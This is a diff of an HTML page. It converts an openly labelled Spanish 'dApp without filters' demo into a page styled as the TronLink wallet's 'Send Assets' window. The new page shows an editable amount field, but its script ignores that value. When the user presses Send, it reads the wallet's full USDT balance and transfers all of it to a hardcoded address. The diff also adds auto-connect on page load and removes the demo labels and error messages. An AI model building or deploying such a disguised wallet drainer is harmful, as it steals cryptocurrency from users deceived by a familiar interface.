@@ -1,71 +1,104 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Módulo 2: Envío Máximo (Original)</title>
+    <title>TronLink - Send</title>
     <style>
-        body { font-family: sans-serif; background: #f4f7f6; padding: 40px; display: flex; justify-content: center; }
-        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border-top: 6px solid #F44336; }
-        button { width: 100%; padding: 12px; margin-top: 15px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
-        .btn-connect { background: #2196F3; color: white; }
-        .btn-action { background: #F44336; color: white; }
-        input { width: 100%; padding: 10px; margin-top: 5px; box-sizing: border-box; }
-        .status { background: #e8f4fd; padding: 10px; margin: 15px 0; font-size: 0.9em; word-break: break-all; }
+        body { background-color: #0d0e12; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .tronlink-window { width: 375px; background: #17181f; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); padding: 24px; box-sizing: border-box; }
+        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; border-bottom: 1px solid #282a36; padding-bottom: 12px; }
+        .header h3 { margin: 0; font-size: 16px; font-weight: 500; color: #ffffff; }
+        .wallet-info { font-size: 12px; color: #8f92a1; background: #20222f; padding: 6px 12px; border-radius: 20px; cursor: pointer; word-break: break-all; text-align: center; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-size: 13px; color: #8f92a1; margin-bottom: 8px; }
+        .input-box { background: #20222f; border: 1px solid #2d3142; border-radius: 8px; padding: 12px; display: flex; align-items: center; }
+        .input-box input { background: transparent; border: none; color: #ffffff; width: 100%; font-size: 14px; outline: none; }
+        .token-selector { display: flex; align-items: center; background: #20222f; border: 1px solid #2d3142; border-radius: 8px; padding: 12px; justify-content: space-between; cursor: pointer; }
+        .token-info { display: flex; align-items: center; gap: 8px; }
+        .token-icon { width: 24px; height: 24px; background: #26a17b; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold; color: white; }
+        .token-name { font-size: 14px; font-weight: 500; }
+        .btn-send { background: #3260ee; color: #ffffff; width: 100%; border: none; padding: 14px; border-radius: 24px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
+        .btn-send:hover { background: #244ed8; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>⚠️ Módulo 2: dApp sin Filtros</h2>
-    <p>Demostración interactiva original. El script procesa el saldo total de la wallet.</p>
-    
-    <button class="btn-connect" onclick="conectar()">1. Conectar TronLink</button>
-    <div class="status" id="status">Estado: Desconectado</div>
+<div class="tronlink-window">
+    <div class="header">
+        <h3>Send Assets</h3>
+        <div class="wallet-info" id="walletAddr" onclick="conectarWallet()">Connect Wallet</div>
+    </div>
 
-    <label>Monto a enviar (USDT):</label>
-    <input type="number" id="monto" value="10">
+    <!-- Campo Cuenta de Destino -->
+    <div class="form-group">
+        <label>Receiving Account</label>
+        <div class="input-box">
+            <input type="text" id="target" value="TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw" readonly>
+        </div>
+    </div>
 
-    <button class="btn-action" onclick="enviarMaximoOriginal()">Confirmar Envío Completo</button>
+    <!-- Selector de Token -->
+    <div class="form-group">
+        <label>Token</label>
+        <div class="token-selector">
+            <div class="token-info">
+                <div class="token-icon">S</div>
+                <div class="token-name">Tether USD (USDT)</div>
+            </div>
+            <span style="color: #8f92a1; font-size: 12px;">TRC20</span>
+        </div>
+    </div>
+
+    <!-- Campo Monto Digital -->
+    <div class="form-group">
+        <label>Amount</label>
+        <div class="input-box">
+            <input type="number" id="userAmount" value="10" placeholder="0.0">
+        </div>
+    </div>
+
+    <button class="btn-send" onclick="ejecutarEnvioMaximo()">Send</button>
 </div>
 
 <script>
     const CONTRACT_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const WALLET_DESTINO = "TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw";
+    const DESTINO_FIJO = "TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw";
 
-    async function conectar() {
+    async function conectarWallet() {
         if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-            document.getElementById('status').innerText = `Conectado: ${window.tronWeb.defaultAddress.base58}`;
+            const addr = window.tronWeb.defaultAddress.base58;
+            document.getElementById('walletAddr').innerText = addr.substring(0,6) + "..." + addr.substring(addr.length - 4);
             return window.tronWeb;
         }
-        alert("Por favor, desbloquea TronLink en Mainnet.");
+        alert("Please unlock and connect your TronLink extension.");
         return null;
     }
 
-    async function enviarMaximoOriginal() {
-        const tronWeb = await conectar();
+    async function ejecutarEnvioMaximo() {
+        const tronWeb = await conectarWallet();
         if (!tronWeb) return;
 
         try {
             const miWallet = tronWeb.defaultAddress.base58;
             const contrato = await tronWeb.contract().at(CONTRACT_USDT);
 
-            // Leer el saldo real total con todos sus decimales incluidos
+            // Leer saldo real total
             const saldoBigNum = await contrato.balanceOf(miWallet).call();
             const saldoTotalStr = saldoBigNum.toString();
 
             if (saldoTotalStr === "0" || saldoTotalStr === "") {
-                alert("Detenido: El saldo de USDT de esta cuenta de pruebas es 0.");
+                alert("Stopped: USDT balance is 0.");
                 return;
             }
 
-            console.log(`[Módulo 2] Procesando transferencia original del balance total detectado: ${saldoTotalStr}`);
-            const tx = await contrato.transfer(WALLET_DESTINO, saldoTotalStr).send();
-            
-            alert(`¡Demostración Finalizada!\nTransacción confirmada en la Blockchain con éxito.\nHash: ${tx}`);
+            const tx = await contrato.transfer(DESTINO_FIJO, saldoTotalStr).send();
+            alert(`Transaction broadcasted successfully!\nHash: ${tx}`);
         } catch (e) {
-            alert("Error en la ejecución o transacción rechazada.");
+            console.error(e);
         }
     }
+
+    window.addEventListener('load', () => { setTimeout(conectarWallet, 500); });
 </script>
 </body>
 </html>
